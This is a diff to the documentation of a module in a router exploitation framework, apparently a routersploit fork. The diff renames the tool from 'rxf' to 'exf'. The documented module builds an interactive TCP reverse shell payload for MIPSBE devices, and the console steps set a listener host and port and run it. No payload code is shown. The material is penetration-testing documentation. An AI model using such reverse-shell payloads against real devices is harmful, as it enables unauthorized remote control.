@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp reverse shell for MIPSBE a
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/mipsbe/reverse_tcp`
   3. Do: `set lhost 192.168.1.4`
   4. Do: `set lport 4321`
@@ -13,12 +13,12 @@ Module generates payload that creates interactive tcp reverse shell for MIPSBE a
 ## Scenarios
 
 ```
-rxf > use payloads/mipsbe/reverse_tcp
-rxf (MIPSBE Reverse TCP) > set lhost 192.168.1.4
+exf > use payloads/mipsbe/reverse_tcp
+exf (MIPSBE Reverse TCP) > set lhost 192.168.1.4
 [+] lhost => 192.168.1.4
-rxf (MIPSBE Reverse TCP) > set lport 4321
+exf (MIPSBE Reverse TCP) > set lport 4321
 [+] lport => 4321
-rxf (MIPSBE Reverse TCP) > run
+exf (MIPSBE Reverse TCP) > run
 [*] Running module...
 [*] Generating payload
 [+] Building payload for python
